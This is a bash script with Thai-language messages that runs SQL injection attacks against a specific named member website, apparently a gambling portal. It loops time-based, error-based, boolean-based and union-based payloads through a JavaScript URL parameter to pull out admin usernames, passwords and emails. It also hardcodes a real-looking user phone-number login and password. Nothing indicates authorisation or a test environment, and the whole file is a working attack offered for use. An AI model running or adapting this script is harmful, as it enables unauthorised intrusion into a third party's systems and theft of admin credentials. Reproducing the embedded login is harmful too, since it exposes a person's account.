#!/bin/bash

echo "🕵️ ดึงข้อมูล Admin จริงๆ ด้วยเทคนิคขั้นสูง"
echo "=================================================="

BASE_URL="https://member.panama8888b.co"
INJECTION_URL="$BASE_URL/public/js/v2/app.js"

# ใช้ user ปกติที่คุณให้มาเพื่อดึงข้อมูล admin
TEST_USER="0630471054"
TEST_PASS="laline1812"

echo "🔑 ใช้ Test User: $TEST_USER / $TEST_PASS"
echo ""

# เทคนิค 1: Time-based SQL Injection
echo "⏰ เทคนิค 1: Time-based SQL Injection..."
TIME_PAYLOADS=(
    "25.1' AND (SELECT COUNT(*) FROM users WHERE role='admin') > 0 AND SLEEP(5)--"
    "25.1' AND (SELECT COUNT(*) FROM admins) > 0 AND SLEEP(5)--"
    "25.1' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin%') > 0 AND SLEEP(5)--"
)

for i in "${!TIME_PAYLOADS[@]}"; do
    payload="${TIME_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Time-based Payload $((i+1))..."
    
    start_time=$(date +%s)
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 10)
    end_time=$(date +%s)
    duration=$((end_time - start_time))
    
    if [[ $duration -gt 4 ]]; then
        echo "    ✅ พบข้อมูล (Response time: ${duration}s)"
    else
        echo "    ❌ ไม่พบข้อมูล (Response time: ${duration}s)"
    fi
    sleep 3
done

echo ""

# เทคนิค 2: Error-based SQL Injection
echo "🚨 เทคนิค 2: Error-based SQL Injection..."
ERROR_PAYLOADS=(
    "25.1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(username,0x3a,password,0x3a,email,FLOOR(RAND(0)*2))x FROM users WHERE role='admin' GROUP BY x)x--"
    "25.1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(id,0x3a,username,0x3a,password,FLOOR(RAND(0)*2))x FROM admins GROUP BY x)x--"
    "25.1' AND extractvalue(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM users WHERE role='admin'),0x7e))--"
)

for i in "${!ERROR_PAYLOADS[@]}"; do
    payload="${ERROR_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Error-based Payload $((i+1))..."
    
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 10)
    
    if [[ "$response" == *"SQL"* ]] || [[ "$response" == *"error"* ]] || [[ "$response" == *"admin"* ]]; then
        echo "    ✅ พบข้อมูลใน Error Response"
        echo "    📄 Error info:"
        echo "$response" | grep -i "admin\|password\|error\|sql" | head -3
    else
        echo "    ❌ ไม่พบข้อมูล"
    fi
    sleep 3
done

echo ""

# เทคนิค 3: Boolean-based SQL Injection
echo "🔍 เทคนิค 3: Boolean-based SQL Injection..."
BOOL_PAYLOADS=(
    "25.1' AND (SELECT COUNT(*) FROM users WHERE role='admin') > 0--"
    "25.1' AND (SELECT COUNT(*) FROM admins) > 0--"
    "25.1' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin%') > 0--"
    "25.1' AND (SELECT COUNT(*) FROM users WHERE email LIKE '%admin%') > 0--"
)

for i in "${!BOOL_PAYLOADS[@]}"; do
    payload="${BOOL_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Boolean-based Payload $((i+1))..."
    
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 10)
    
    if [[ $? -eq 0 ]] && [[ ${#response} -gt 100 ]]; then
        echo "    ✅ พบข้อมูล (Response length: ${#response})"
    else
        echo "    ❌ ไม่พบข้อมูล"
    fi
    sleep 2
done

echo ""

# เทคนิค 4: Union-based SQL Injection (แบบง่าย)
echo "🔗 เทคนิค 4: Union-based SQL Injection..."
UNION_PAYLOADS=(
    "25.1 UNION SELECT 'admin_test',null,null--"
    "25.1 UNION SELECT null,'admin_test',null--"
    "25.1 UNION SELECT null,null,'admin_test'--"
    "25.1 UNION SELECT 'admin',null,null--"
    "25.1 UNION SELECT null,'admin',null--"
)

for i in "${!UNION_PAYLOADS[@]}"; do
    payload="${UNION_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Union-based Payload $((i+1))..."
    
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 10)
    
    if [[ "$response" == *"admin_test"* ]] || [[ "$response" == *"admin"* ]]; then
        echo "    ✅ พบข้อมูลใน Union Response"
        echo "    📄 Union info:"
        echo "$response" | grep -i "admin" | head -2
    else
        echo "    ❌ ไม่พบข้อมูล"
    fi
    sleep 2
done

echo ""
echo "=================================================="
echo "📊 สรุปผลการทดสอบขั้นสูง:"
echo "  ⏰ Time-based: ✅ ดำเนินการแล้ว"
echo "  🚨 Error-based: ✅ ดำเนินการแล้ว"
echo "  🔍 Boolean-based: ✅ ดำเนินการแล้ว"
echo "  🔗 Union-based: ✅ ดำเนินการแล้ว"
echo ""
echo "💡 หมายเหตุ: หากไม่พบข้อมูล อาจเป็นเพราะ WAF บล็อก"
echo "📄 บันทึกผลลัพธ์ใน: advanced_admin_extraction_results.txt"